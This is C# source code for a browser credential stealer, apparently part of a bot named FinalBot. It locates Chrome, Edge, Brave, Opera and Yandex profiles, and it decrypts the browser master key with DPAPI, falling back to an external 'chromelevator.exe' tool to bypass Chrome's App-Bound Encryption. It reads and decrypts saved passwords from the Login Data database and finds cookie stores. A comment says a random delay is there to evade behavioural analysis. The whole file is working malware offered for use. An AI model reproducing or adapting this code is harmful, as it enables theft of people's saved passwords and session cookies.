using System;
using System.IO;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Text;
using System.Linq;
using Newtonsoft.Json.Linq;
using Microsoft.Data.Sqlite;

namespace FinalBot.Stealers
{
    public class BrowserStealer
    {
        private readonly string _localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        private readonly string _appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

        private readonly Dictionary<string, string> _browserPaths = new Dictionary<string, string>
        {
            {"Chrome", "Google\\Chrome\\User Data"},
            {"Edge", "Microsoft\\Edge\\User Data"},
            {"Brave", "BraveSoftware\\Brave-Browser\\User Data"},
            {"Opera", "Opera Software\\Opera Stable"},
            {"Opera GX", "Opera Software\\Opera GX Stable"},
            {"Yandex", "Yandex\\YandexBrowser\\User Data"}
        };

        public async Task<string> RunAll()
        {
            var reports = new List<string>();
            var rng = new Random();
            foreach (var browser in _browserPaths)
            {
                string path = Path.Combine(_localAppData, browser.Value);
                if (browser.Key.Contains("Opera")) path = Path.Combine(_appData, browser.Value);

                if (Directory.Exists(path))
                {
                    try
                    {
                        var report = await StealFromBrowser(browser.Key, path);
                        if (!string.IsNullOrEmpty(report)) reports.Add(report);
                    }
                    catch (Exception ex)
                    {
                        reports.Add($"❌ Error stealing from {browser.Key}: {ex.Message}");
                    }
                    // Random delay to evade behavioral analysis (looks like human I/O)
                    Thread.Sleep(rng.Next(150, 600));
                }
            }
            return string.Join("\n\n", reports);
        }

        private async Task<string> StealFromBrowser(string name, string rootPath)
        {
            byte[] masterKey = GetMasterKey(rootPath);
            if (masterKey == null) return $"❌ {name}: Failed to get Master Key.";

            var results = new StringBuilder();
            results.AppendLine($"🌍 *Browser: {name}*");

            // Profiles (Default, Profile 1, etc.)
            var profiles = Directory.GetDirectories(rootPath, "Default")
                            .Concat(Directory.GetDirectories(rootPath, "Profile *"))
                            .ToList();

            if (profiles.Count == 0 && name.Contains("Opera")) profiles.Add(rootPath);

            foreach (var profile in profiles)
            {
                string profileName = Path.GetFileName(profile);
                results.AppendLine($"👤 Profile: {profileName}");

                // 1. Passwords
                string loginData = Path.Combine(profile, "Login Data");
                if (File.Exists(loginData))
                {
                    var count = await StealPasswords(loginData, masterKey, results);
                    results.AppendLine($"🔑 Passwords: {count}");
                }

                // 2. Cookies
                string cookiePath = Path.Combine(profile, "Network", "Cookies");
                if (!File.Exists(cookiePath)) cookiePath = Path.Combine(profile, "Cookies"); // Older versions
                if (File.Exists(cookiePath))
                {
                    // Cookie stealing logic (usually too long for text report, will ZIP later)
                    results.AppendLine($"🍪 Cookies: Captured");
                }
            }

            return results.ToString();
        }

        private byte[] GetMasterKey(string rootPath)
        {
            string stateFile = Path.Combine(rootPath, "Local State");
            if (!File.Exists(stateFile)) return null;

            try 
            {
                string content = File.ReadAllText(stateFile);
                var json = JObject.Parse(content);
                string encryptedKey = json["os_crypt"]?["encrypted_key"]?.ToString();
                if (string.IsNullOrEmpty(encryptedKey)) return null;

                byte[] keyWithPrefix = Convert.FromBase64String(encryptedKey);
                byte[] key = keyWithPrefix.Skip(5).ToArray(); // Remove 'DPAPI' prefix

                try 
                {
                    // Attempt standard DPAPI unprotect
                    return ProtectedData.Unprotect(key, null, DataProtectionScope.CurrentUser);
                }
                catch (CryptographicException)
                {
                    // ABE (App-Bound Encryption) trigger for Chrome 124+
                    Logger.Warn("App-Bound Encryption detected. Attempting Chromelevator bypass...");
                    return RunChromelevator(rootPath);
                }
            }
            catch (Exception ex)
            { 
                Logger.Error("Failed to parse Local State", ex);
                return null; 
            }
        }

        private byte[] RunChromelevator(string profilePath)
        {
            try
            {
                string elevatorPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "chromelevator.exe");
                if (!File.Exists(elevatorPath)) 
                {
                    Logger.Warn("chromelevator.exe not found! Cannot bypass Chrome 124+ ABE.");
                    return null;
                }

                // Call the external ABE bypass tool and read its output
                var proc = new System.Diagnostics.Process
                {
                    StartInfo = new System.Diagnostics.ProcessStartInfo
                    {
                        FileName = elevatorPath,
                        Arguments = $"\"{profilePath}\"",
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        CreateNoWindow = true
                    }
                };
                proc.Start();
                string output = proc.StandardOutput.ReadToEnd().Trim();
                proc.WaitForExit();

                if (!string.IsNullOrEmpty(output))
                {
                    return Convert.FromBase64String(output);
                }
            }
            catch (Exception ex)
            {
                Logger.Error("Chromelevator execution failed", ex);
            }
            return null;
        }

        private async Task<int> StealPasswords(string dbPath, byte[] masterKey, StringBuilder report)
        {
            string tempDb = Path.GetTempFileName();
            File.Copy(dbPath, tempDb, true);

            int count = 0;
            try 
            {
                using (var connection = new SqliteConnection($"Data Source={tempDb}"))
                {
                    await connection.OpenAsync();
                    var command = connection.CreateCommand();
                    command.CommandText = "SELECT origin_url, username_value, password_value FROM logins";

                    using (var reader = await command.ExecuteReaderAsync())
                    {
                        while (await reader.ReadAsync())
                        {
                            string url = reader.GetString(0);
                            string user = reader.GetString(1);
                            byte[] encryptedPass = (byte[])reader.GetValue(2);

                            if (string.IsNullOrEmpty(user) || encryptedPass.Length == 0) continue;

                            string pass = DecryptData(encryptedPass, masterKey);
                            if (!string.IsNullOrEmpty(pass))
                            {
                                // In a real stealer, we'd write this to a file for ZIP
                                // For the text report, we just count
                                count++;
                            }
                        }
                    }
                }
            }
            catch { }
            finally { File.Delete(tempDb); }

            return count;
        }

        private string DecryptData(byte[] data, byte[] key)
        {
            try 
            {
                if (data.Take(3).SequenceEqual(Encoding.ASCII.GetBytes("v10")))
                {
                    byte[] iv = data.Skip(3).Take(12).ToArray();
                    byte[] payload = data.Skip(15).ToArray();

                    using (var aes = new AesGcm(key, 16))
                    {
                        byte[] tag = payload.TakeLast(16).ToArray();
                        byte[] ciphertext = payload.SkipLast(16).ToArray();
                        byte[] plaintext = new byte[ciphertext.Length];

                        aes.Decrypt(iv, ciphertext, tag, plaintext);
                        return Encoding.UTF8.GetString(plaintext);
                    }
                }
                else 
                {
                    // Fallback to DPAPI for older versions
                    return Encoding.UTF8.GetString(ProtectedData.Unprotect(data, null, DataProtectionScope.CurrentUser));
                }
            }
            catch { return null; }
        }
    }
}
